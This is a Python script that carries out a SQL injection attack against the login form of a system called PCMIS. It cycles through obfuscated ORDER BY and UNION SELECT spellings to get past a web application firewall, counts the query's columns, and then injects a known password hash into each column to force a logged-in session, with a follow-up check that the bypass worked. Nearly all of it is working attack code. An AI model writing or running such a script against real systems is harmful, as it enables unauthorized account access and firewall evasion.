"""WAF-aware column enumeration on the PCMIS login, then hash-column discovery.

union.py died at ORDER BY 1 with a *403*, not an app error - so the firewall,
not the SQL, rejected the request. This probes keyword spellings first and uses
whichever survives.

Signal stays the same: baseline text 'wrong user name OR password' means the
query failed or matched nothing; `ok` (200, no error) means it executed and
returned a row. Only `ok` is treated as progress.

Phase 3 is the actual goal: put a hash we control into each column in turn and
try to log in with the matching plaintext. A `SESSION` result is a bypass.
"""
import sys
import time

sys.path.insert(0, ".")
import mislogin  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ERR = "wrong user name OR password"
PAUSE = 5

# Same keyword, softened. WAF rules usually match one literal form.
ORDER_SPELLINGS = ["ORDER BY", "ORDER  BY", "ORDER+BY", "order by",
                   "ORDER/*!*/BY", "ORDER%09BY"]
UNION_SPELLINGS = ["UNION SELECT", "UNION  SELECT", "union select",
                   "UNION+SELECT", "UNION/*!*/SELECT", "UNION ALL SELECT"]


def test(user, pwd="x", retries=2):
    """One login attempt. Returns (state, text). Retries a dead host, never a 403."""
    for _ in range(retries + 1):
        time.sleep(PAUSE)
        meta, txt, _raw = mislogin.attempt(user, pwd)
        if meta.startswith(("down", "no token")) or "post=0" in meta or "after=0" in meta:
            print("     (host down, retrying)")
            continue
        if "post=403" in meta or "after=403" in meta:
            return "WAF403", txt
        if ERR in txt:
            return "error", txt
        return "ok", txt
    return "DOWN", txt


def drop(term):
    """SQL comment spelling that survived filter values earlier."""
    return f"{term}-- -"


print("== phase 0: baseline + which spellings survive the WAF")
st, _ = test("admin'-- -")
print(f"  control admin'-- -  -> {st}")
if st != "ok":
    print("  baseline did not behave; stopping so we do not chase noise")
    sys.exit(1)

order = None
for sp in ORDER_SPELLINGS:
    st, _ = test(drop(f"admin' {sp} 1"))
    print(f"  {sp:18} -> {st}")
    if st == "ok":
        order = sp
        break
    if st == "DOWN":
        sys.exit("  host fell over during spelling probe")

print()
if order:
    print(f"== phase 1: ORDER BY sweep via {order!r} (stop at first error)")
    last_ok = 0
    for n in range(1, 13):
        st, _ = test(drop(f"admin' {order} {n}"))
        print(f"  n={n:2} -> {st}")
        if st == "DOWN":
            sys.exit(f"  host fell over at n={n}; last clean n={last_ok}")
        if st == "error":
            print(f"  => column count is {n - 1}")
            break
        last_ok = n
    cols = last_ok
else:
    print("== phase 1: no ORDER BY survived; UNION-count instead")
    cols = 0
    union = None
    for sp in UNION_SPELLINGS:
        st, _ = test(drop("admin' " + sp + " 1"))
        print(f"  {sp:18} 1 col -> {st}")
        if st == "ok":
            union = sp
            cols = 1
            break
        if st == "DOWN":
            sys.exit("  host fell over during spelling probe")
    if not union:
        sys.exit("  no UNION spelling survived either")
    while cols < 12:
        nxt = cols + 1
        st, _ = test(drop(f"admin' {union} " + ",".join(str(i) for i in range(1, nxt + 1))))
        print(f"  {nxt:2} cols -> {st}")
        if st == "DOWN":
            sys.exit(f"  host fell over at {nxt} columns; last clean {cols}")
        if st == "ok":
            cols = nxt
            break

if not 1 <= cols <= 12:
    sys.exit(f"  unusable column count: {cols}")

print(f"\n== phase 2: confirmed {cols} column(s)")
print("== phase 3: place a hash we control in each column")

UNION_KW = union or "UNION SELECT"

import hashlib  # noqa: E402
MD5X = hashlib.md5(b"x").hexdigest()
MD5EMPTY = hashlib.md5(b"").hexdigest()

# (label, value injected into the column, password to submit)
SEEDS = [("md5(x)", MD5X, "x"),
         ("plain x", "x", "x"),
         ("md5(empty)", MD5EMPTY, "")]

for idx in range(cols):
    for label, seed, pwd in SEEDS:
        vals = [str(i + 1) for i in range(cols)]
        vals[idx] = f"'{seed}'"
        if idx != 0:                 # keep a username in the id column
            vals[0] = "'admin'"
        payload = drop("zzz' " + UNION_KW + " " + ",".join(vals))
        st, txt = test(payload, pwd)
        print(f"  col {idx + 1:2} {label:11} -> {st}")
        if st == "ok":
            # Confirm the row actually carried a usable credential: same payload,
            # deliberately wrong password. If that errors, the difference is the
            # password compare and not just "a query ran".
            st2, _ = test(payload, (pwd or "") + "zqz")
            if st2 == "error":
                print("\n  *** SESSION - differential confirmed ***")
            elif st2 == "ok":
                print("\n  ok, but password-insensitive (row returned, no compare) - unproven")
            else:
                print(f"\n  ok, confirmation inconclusive ({st2})")
            print(f"    {payload}")
            print(f"    password {pwd!r}")
            sys.exit(0 if st2 == "error" else 2)
        if st == "DOWN":
            sys.exit(f"  host fell over probing column {idx + 1}")

print("\nno session. Columns that survived above still localise the password field.")

